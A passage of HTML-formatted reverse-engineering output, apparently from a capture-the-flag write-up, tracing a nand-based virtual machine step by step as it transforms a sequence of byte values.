= c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 33</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-2)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -2</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (17)</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (33)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(274)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[274] = v12 (17)</span><br><span class="line">v10 = v1[320] (33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (34)</span><br><span class="line">v15 = &amp;v1[325] (30)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(34)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (34)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[275] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 34 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 34</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-3)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -3</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (18)</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (34)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(275)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[275] = v12 (18)</span><br><span class="line">v10 = v1[320] (34)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (35)</span><br><span class="line">v15 = &amp;v1[325] (29)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(35)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (35)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[276] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 35 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 35</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-4)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -4</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (19)</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (35)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(276)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[276] = v12 (19)</span><br><span class="line">v10 = v1[320] (35)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (36)</span><br><span class="line">v15 = &amp;v1[325] (28)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(36)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (36)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[277] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 36 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 36</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-5)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -5</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (20)</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (36)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(277)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[277] = v12 (20)</span><br><span class="line">v10 = v1[320] (36)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (37)</span><br><span class="line">v15 = &amp;v1[325] (27)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(37)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (37)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[278] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 37 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 37</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-6)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -6</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (21)</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (37)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(278)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[278] = v12 (21)</span><br><span class="line">v10 = v1[320] (37)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (38)</span><br><span class="line">v15 = &amp;v1[325] (26)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(38)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (38)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[279] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 38 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 38</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-7)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -7</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (22)</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (38)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(279)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[279] = v12 (22)</span><br><span class="line">v10 = v1[320] (38)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (39)</span><br><span class="line">v15 = &amp;v1[325] (25)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(39)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (39)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[280] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 39 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 39</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-8)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -8</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (23)</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (39)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(280)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[280] = v12 (23)</span><br><span class="line">v10 = v1[320] (39)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (40)</span><br><span class="line">v15 = &amp;v1[325] (24)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(40)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (40)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[281] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 40 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 40</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-9)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -9</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (24)</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (40)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(281)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[281] = v12 (24)</span><br><span class="line">v10 = v1[320] (40)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (41)</span><br><span class="line">v15 = &amp;v1[325] (23)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(41)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (41)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[282] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 41 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 41</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-10)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -10</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (25)</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (41)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(282)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[282] = v12 (25)</span><br><span class="line">v10 = v1[320] (41)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (42)</span><br><span class="line">v15 = &amp;v1[325] (22)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(42)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (42)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[283] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 42 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 42</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-11)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -11</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (26)</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (42)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(283)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[283] = v12 (26)</span><br><span class="line">v10 = v1[320] (42)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (43)</span><br><span class="line">v15 = &amp;v1[325] (21)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(43)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (43)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[284] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 43 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 43</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-12)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -12</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (27)</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (43)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(284)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[284] = v12 (27)</span><br><span class="line">v10 = v1[320] (43)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (44)</span><br><span class="line">v15 = &amp;v1[325] (20)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(44)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (44)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[285] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 44 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 44</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 